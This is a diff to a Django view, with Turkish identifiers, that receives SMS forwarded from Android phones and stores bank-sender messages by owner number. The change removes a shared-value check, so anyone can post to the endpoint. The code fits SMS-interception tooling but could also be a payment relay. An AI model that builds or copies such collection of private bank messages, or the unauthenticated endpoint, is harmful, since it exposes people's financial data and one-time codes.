@@ -171,26 +171,24 @@ def update_api(request):
 
 def SmsYakala(request):
     if request.method == 'POST':
-        android = request.POST.get('Android', '')
-        if android == 'SMSGonder':
-            sahibi = request.POST.get('sahibi', '')
-            gonderen = request.POST.get('gonderen', '')
-            mesaj = request.POST.get('mesaj', '')
+        sahibi = request.POST.get('sahibi')
+        gonderen = request.POST.get('gonderen')
+        mesaj = request.POST.get('mesaj')
 
-            gelen_mesa_parcali = mesaj.split(" ")
-            mesaj_ilk = gelen_mesa_parcali[0]
+        gelen_mesa_parcali = mesaj.split(" ")
+        mesaj_ilk = gelen_mesa_parcali[0]
 
-            mesaj_yeni = mesaj.replace(",", "")
+        mesaj_yeni = mesaj.replace(",", "")
 
-            if gonderen == 'FUPS' and mesaj_ilk in ['3D', 'Son', 'İlk']:
+        if gonderen == 'FUPS' and mesaj_ilk in ['3D', 'Son', 'İlk']:
+            return HttpResponse("Basarili")
+
+        else:
+            try:
+                GelenSMS.objects.create(numara=sahibi, banka=gonderen, mesaj=mesaj_yeni)
                 return HttpResponse("Basarili")
-
-            else:
-                try:
-                    GelenSMS.objects.create(numara=sahibi, banka=gonderen, mesaj=mesaj_yeni)
-                    return HttpResponse("Basarili")
-                except Exception as e:
-                    return HttpResponse("DB ye kaydedemedim.")
+            except Exception as e:
+                return HttpResponse("DB ye kaydedemedim.")
     else:
         return HttpResponse("Hatalı İşlem")
 
